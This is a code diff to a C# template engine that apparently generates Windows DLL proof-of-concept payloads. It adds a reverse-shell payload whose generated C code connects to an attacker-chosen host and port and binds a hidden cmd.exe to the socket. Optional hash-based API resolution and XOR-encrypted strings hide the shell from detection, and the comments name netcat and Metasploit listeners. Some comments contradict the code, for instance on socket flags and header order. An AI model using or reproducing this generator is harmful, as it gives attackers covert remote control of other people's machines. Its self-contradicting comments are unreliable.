@@ -153,6 +153,19 @@ public static class TemplateEngine
         var sb = new StringBuilder();
 
         // Includes
+        // Canonical Windows header order: <winsock2.h> MUST come before
+        // <windows.h> so that windows.h sees _WINSOCKAPI_ already defined and
+        // skips the legacy winsock1 declarations. Including in the reverse
+        // order triggers MinGW's "Please include winsock2.h before windows.h"
+        // warning (and on the MSVC SDK breaks compilation outright on struct
+        // sockaddr / fd_set redefinitions). WIN32_LEAN_AND_MEAN is belt-and-
+        // braces — also strips RPC/OLE bits we don't use.
+        if (config.Payload == PayloadType.ReverseShell)
+        {
+            sb.AppendLine("#define WIN32_LEAN_AND_MEAN");
+            sb.AppendLine("#include <winsock2.h>");
+            sb.AppendLine("#include <ws2tcpip.h>");
+        }
         sb.AppendLine("#include <windows.h>");
         sb.AppendLine("#include <stdio.h>");
         if (config.Payload == PayloadType.SandboxEscape) sb.AppendLine("#include <tlhelp32.h>");
@@ -255,6 +268,17 @@ public static class TemplateEngine
         sb.AppendLine("#include <windows.h>");
         sb.AppendLine("#include <stdio.h>");
         if (config.Payload == PayloadType.SandboxEscape) sb.AppendLine("#include <tlhelp32.h>");
+        if (config.Payload == PayloadType.ReverseShell)
+        {
+            // winsock2.h MUST precede windows.h in many SDKs, but MinGW's <windows.h>
+            // already excludes the old winsock1 bits when WIN32_LEAN_AND_MEAN is set
+            // OR when winsock2.h is the first/only socket header pulled. Including
+            // it after <windows.h> here works on MinGW because the canonical guard
+            // (_WINSOCKAPI_) hasn't been triggered yet — neither <windows.h> nor
+            // <stdio.h> pull winsock1 by default on MinGW.
+            sb.AppendLine("#include <winsock2.h>");
+            sb.AppendLine("#include <ws2tcpip.h>");
+        }
         if (config.DInvoke) sb.AppendLine("#include \"dinvoke.h\"");
         if (config.DirectSyscalls) sb.AppendLine("#include \"syscalls.h\"");
         if (config.EncryptStrings) sb.AppendLine("#include \"cryptor.h\"");
@@ -344,6 +368,19 @@ public static class TemplateEngine
         var sb = new StringBuilder();
 
         // Includes
+        // Canonical Windows header order: <winsock2.h> MUST come before
+        // <windows.h> so that windows.h sees _WINSOCKAPI_ already defined and
+        // skips the legacy winsock1 declarations. Including in the reverse
+        // order triggers MinGW's "Please include winsock2.h before windows.h"
+        // warning (and on the MSVC SDK breaks compilation outright on struct
+        // sockaddr / fd_set redefinitions). WIN32_LEAN_AND_MEAN is belt-and-
+        // braces — also strips RPC/OLE bits we don't use.
+        if (config.Payload == PayloadType.ReverseShell)
+        {
+            sb.AppendLine("#define WIN32_LEAN_AND_MEAN");
+            sb.AppendLine("#include <winsock2.h>");
+            sb.AppendLine("#include <ws2tcpip.h>");
+        }
         sb.AppendLine("#include <windows.h>");
         sb.AppendLine("#include <stdio.h>");
         if (config.Payload == PayloadType.SandboxEscape) sb.AppendLine("#include <tlhelp32.h>");
@@ -545,6 +582,9 @@ public static class TemplateEngine
 
         if (config.Payload == PayloadType.SandboxEscape)
             return GenerateSandboxEscapePayload(config);
+
+        if (config.Payload == PayloadType.ReverseShell)
+            return GenerateReverseShellPayload(config);
 
         // Proof file write — prepended to MessageBox/Command payloads so even if
         // the visual UI is invisible (service desktop, X server like XWin_MobaX,
@@ -824,6 +864,167 @@ public static class TemplateEngine
         return sb.ToString();
     }
 
+    /// <summary>
+    /// TCP reverse-shell payload: WSAStartup → WSASocketW → connect → CreateProcessA("cmd.exe")
+    /// with si.hStdInput/Output/Error all wired to the socket. Listener side:
+    /// `nc -lvnp PORT` / `ncat -lvnp PORT` / msfconsole exploit/multi/handler.
+    ///
+    /// Resolution strategy (same gate as MessageBox/Shellcode for consistency):
+    ///   · DInvoke: DINVOKE(H_WS2_32_DLL, H_WSASTARTUP, fn_WSAStartup) macros — all
+    ///     hashes and typedefs live in dinvoke.h, no per-payload duplication.
+    ///   · EncryptStrings (no DInvoke): LoadLibraryA + GetProcAddress with the
+    ///     resolution strings (ws2_32.dll, WSAStartup, …) XOR-encrypted.
+    ///   · Plain: LoadLibraryA + GetProcAddress by literal name — easiest to
+    ///     read in a write-up advisory.
+    ///
+    /// Host/port encoding: the IP is parsed at template time when ReverseShellHost
+    /// is a dotted-quad (emitted as raw network-order bytes — no inet_addr / no
+    /// inet_pton dependency, no runtime DNS). When it's a hostname, we fall back
+    /// to inet_addr at runtime; that's deliberate so research can target dynamic
+    /// listeners (ngrok, .local mDNS, etc.). The port is host→network swapped
+    /// at template time to avoid linking htons.
+    /// </summary>
+    private static string GenerateReverseShellPayload(TemplateConfig config)
+    {
+        var host = string.IsNullOrWhiteSpace(config.ReverseShellHost) ? "127.0.0.1" : config.ReverseShellHost.Trim();
+        var port = config.ReverseShellPort > 0 && config.ReverseShellPort < 65536
+            ? config.ReverseShellPort : 4444;
+
+        // Try to parse as dotted-quad → emit raw bytes (no inet_addr). On parse
+        // failure, fall back to runtime inet_addr (covers hostnames and unusual
+        // numeric forms — researcher can override per-PoC via the config field).
+        bool literalIp = System.Net.IPAddress.TryParse(host, out var ipAddr)
+            && ipAddr.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork;
+        string sinAddrInit;
+        if (literalIp)
+        {
+            var b = ipAddr!.GetAddressBytes();   // already network-order for IPv4
+            // s_addr is a ULONG in network order. Pack the four bytes little-endian
+            // into the ULONG so that when reinterpreted byte-wise the order matches
+            // wire format (b0.b1.b2.b3).
+            uint packed = (uint)b[0] | ((uint)b[1] << 8) | ((uint)b[2] << 16) | ((uint)b[3] << 24);
+            sinAddrInit = $"sa.sin_addr.s_addr = 0x{packed:X8}UL; /* {host} */";
+        }
+        else
+        {
+            // Hostname or non-trivial IP — defer to runtime inet_addr. Wrapped so
+            // that even if the user's host string contains weirdness, the C
+            // literal stays valid (escape backslashes + quotes for safety).
+            var escapedHost = CEscapeForLiteral(host);
+            sinAddrInit = $"sa.sin_addr.s_addr = inet_addr(\"{escapedHost}\"); /* runtime resolve */";
+        }
+
+        // Network-order port: byte-swap host→network at template time.
+        ushort nport = (ushort)(((port & 0xFF) << 8) | ((port >> 8) & 0xFF));
+
+        var proof = config.WriteProofFile ? GenerateProofFileSnippet() : "";
+
+        var sb = new StringBuilder();
+        sb.AppendLine("static void do_payload(void) {");
+        if (!string.IsNullOrEmpty(proof)) sb.Append(proof);
+
+        // ── API resolution ──
+        // DInvoke uses dinvoke.h's H_* hash macros + fn_* typedefs. WS2_32
+        // typedefs in dinvoke.h are gated behind _WINSOCK2API_, which the
+        // #include <winsock2.h> at file top already triggers — so fn_WSAStartup
+        // and friends are visible here without any extra ceremony.
+        if (config.DInvoke)
+        {
+            sb.AppendLine("    fn_WSAStartup    pStartup = DINVOKE(H_WS2_32_DLL,  H_WSASTARTUP,    fn_WSAStartup);");
+            sb.AppendLine("    fn_WSASocketW    pSocket  = DINVOKE(H_WS2_32_DLL,  H_WSASOCKETW,    fn_WSASocketW);");
+            sb.AppendLine("    fn_connect       pConnect = DINVOKE(H_WS2_32_DLL,  H_CONNECT,       fn_connect);");
+            sb.AppendLine("    fn_closesocket   pClose   = DINVOKE(H_WS2_32_DLL,  H_CLOSESOCKET,   fn_closesocket);");
+            sb.AppendLine("    fn_CreateProcessA pCP     = DINVOKE(H_KERNEL32_DLL, H_CREATEPROCESSA, fn_CreateProcessA);");
+            // DINVOKE() walks PEB so ws2_32 must already be loaded. If the host
+            // process hasn't pulled winsock yet (most don't), force-load it via
+            // LoadLibraryA — that triggers PEB insertion before the first
+            // dinvoke_get_module call. After that the macros resolve cleanly.
+            sb.AppendLine("    if (!pStartup) {");
+            sb.AppendLine("        LoadLibraryA(\"ws2_32.dll\");");
+            sb.AppendLine("        pStartup = DINVOKE(H_WS2_32_DLL, H_WSASTARTUP,  fn_WSAStartup);");
+            sb.AppendLine("        pSocket  = DINVOKE(H_WS2_32_DLL, H_WSASOCKETW,  fn_WSASocketW);");
+            sb.AppendLine("        pConnect = DINVOKE(H_WS2_32_DLL, H_CONNECT,     fn_connect);");
+            sb.AppendLine("        pClose   = DINVOKE(H_WS2_32_DLL, H_CLOSESOCKET, fn_closesocket);");
+            sb.AppendLine("    }");
+            sb.AppendLine("    if (!pStartup || !pSocket || !pConnect || !pClose || !pCP) return;");
+        }
+        else if (config.EncryptStrings)
+        {
+            // Non-DInvoke + XOR: encrypt the resolution strings so the binary
+            // doesn't reveal "ws2_32.dll" / "WSAStartup" in plain strings.
+            sb.Append(GenerateEncryptedString("ws2_32.dll", "ws2_name", config.XorKey));
+            sb.Append(GenerateEncryptedString("WSAStartup", "n_start", config.XorKey));
+            sb.Append(GenerateEncryptedString("WSASocketW", "n_sock",  config.XorKey));
+            sb.Append(GenerateEncryptedString("connect",    "n_conn",  config.XorKey));
+            sb.Append(GenerateEncryptedString("closesocket","n_close", config.XorKey));
+            sb.Append(GenerateEncryptedString("CreateProcessA","n_cp", config.XorKey));
+            sb.AppendLine("    HMODULE hWs2 = LoadLibraryA(ws2_name);");
+            sb.AppendLine("    if (!hWs2) return;");
+            sb.AppendLine("    fn_WSAStartup     pStartup = (fn_WSAStartup)    GetProcAddress(hWs2, n_start);");
+            sb.AppendLine("    fn_WSASocketW     pSocket  = (fn_WSASocketW)    GetProcAddress(hWs2, n_sock);");
+            sb.AppendLine("    fn_connect        pConnect = (fn_connect)       GetProcAddress(hWs2, n_conn);");
+            sb.AppendLine("    fn_closesocket    pClose   = (fn_closesocket)   GetProcAddress(hWs2, n_close);");
+            sb.AppendLine("    HMODULE hK32 = GetModuleHandleA(\"kernel32.dll\");");
+            sb.AppendLine("    fn_CreateProcessA pCP      = (fn_CreateProcessA)GetProcAddress(hK32, n_cp);");
+            sb.AppendLine("    if (!pStartup || !pSocket || !pConnect || !pClose || !pCP) return;");
+        }
+        else
+        {
+            // Plain path: LoadLibraryA + GetProcAddress by name. Easiest to
+            // read in a write-up advisory — strings are in the binary.
+            sb.AppendLine("    HMODULE hWs2 = LoadLibraryA(\"ws2_32.dll\");");
+            sb.AppendLine("    if (!hWs2) return;");
+            sb.AppendLine("    fn_WSAStartup     pStartup = (fn_WSAStartup)    GetProcAddress(hWs2, \"WSAStartup\");");
+            sb.AppendLine("    fn_WSASocketW     pSocket  = (fn_WSASocketW)    GetProcAddress(hWs2, \"WSASocketW\");");
+            sb.AppendLine("    fn_connect        pConnect = (fn_connect)       GetProcAddress(hWs2, \"connect\");");
+            sb.AppendLine("    fn_closesocket    pClose   = (fn_closesocket)   GetProcAddress(hWs2, \"closesocket\");");
+            sb.AppendLine("    HMODULE hK32 = GetModuleHandleA(\"kernel32.dll\");");
+            sb.AppendLine("    fn_CreateProcessA pCP      = (fn_CreateProcessA)GetProcAddress(hK32, \"CreateProcessA\");");
+            sb.AppendLine("    if (!pStartup || !pSocket || !pConnect || !pClose || !pCP) return;");
+        }
+
+        // ── WSA init + socket + connect ──
+        sb.AppendLine("    WSADATA wsa;");
+        sb.AppendLine("    if (pStartup(MAKEWORD(2,2), &wsa) != 0) return;");
+        // WSA_FLAG_OVERLAPPED = 0x01 — required for STARTF_USESTDHANDLES inheritance
+        // to work cleanly on the child process. dwFlags=0 silently drops events.
+        sb.AppendLine("    SOCKET s = pSocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);");
+        sb.AppendLine("    if (s == INVALID_SOCKET) return;");
+        sb.AppendLine("    struct sockaddr_in sa;");
+        sb.AppendLine("    ZeroMemory(&sa, sizeof(sa));");
+        sb.AppendLine("    sa.sin_family = AF_INET;");
+        sb.AppendLine($"    sa.sin_port = 0x{nport:X4};   /* htons({port}) = 0x{nport:X4} */");
+        sb.AppendLine($"    {sinAddrInit}");
+        sb.AppendLine("    if (pConnect(s, (struct sockaddr*)&sa, sizeof(sa)) == SOCKET_ERROR) {");
+        sb.AppendLine("        pClose(s); return;");
+        sb.AppendLine("    }");
+
+        // ── Spawn cmd.exe with stdio bound to the socket ──
+        // STARTUPINFOA + bInheritHandles=TRUE wires the child's stdin/stdout/stderr
+        // to the connected socket. We don't set lpDesktop here — the child stays
+        // headless (no console window flash), which is the point of a reverse
+        // shell vs. a visible cmd. When EncryptStrings is on the cmdline string
+        // is XOR-encrypted so "cmd.exe" doesn't appear in the binary regardless
+        // of whether DInvoke is also on.
+        if (config.EncryptStrings)
+            sb.Append(GenerateEncryptedString("cmd.exe", "shell", config.XorKey));
+        else
+            sb.AppendLine("    CHAR shell[] = \"cmd.exe\";");
+        sb.AppendLine("    STARTUPINFOA si; ZeroMemory(&si, sizeof(si));");
+        sb.AppendLine("    si.cb = sizeof(si);");
+        sb.AppendLine("    si.dwFlags = STARTF_USESTDHANDLES;");
+        sb.AppendLine("    si.hStdInput  = (HANDLE)s;");
+        sb.AppendLine("    si.hStdOutput = (HANDLE)s;");
+        sb.AppendLine("    si.hStdError  = (HANDLE)s;");
+        sb.AppendLine("    PROCESS_INFORMATION pi; ZeroMemory(&pi, sizeof(pi));");
+        sb.AppendLine("    pCP(NULL, shell, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);");
+        sb.AppendLine("    if (pi.hProcess) CloseHandle(pi.hProcess);");
+        sb.AppendLine("    if (pi.hThread)  CloseHandle(pi.hThread);");
+        sb.AppendLine("}");
+
+        return sb.ToString();
+    }
+
     private static string GeneratePayloadInvoke(TemplateConfig config)
     {
         var sb = new StringBuilder();
@@ -894,6 +1095,11 @@ public static class TemplateEngine
             "-o", analysis.Filename, $"{srcName}.c", $"{srcName}.def" };
         if (!string.IsNullOrEmpty(incFlag)) parts.Add(incFlag);
         parts.Add("-ladvapi32");
+        // ReverseShell needs Winsock2 (WSAStartup, WSASocketW, connect, closesocket
+        // are exported from ws2_32.dll). Adding it unconditionally would inflate
+        // the import table for every other payload; gate on the payload kind so
+        // a MessageBox PoC stays minimal.
+        if (config.Payload == PayloadType.ReverseShell) parts.Add("-lws2_32");
         // -Wl,--kill-at strips the stdcall "@N" suffix from stub_ord_N exports so MinGW's
         // linker stops warning about resolving "foo by linking to foo@0". No runtime effect.
         parts.Add("-Wl,--kill-at");
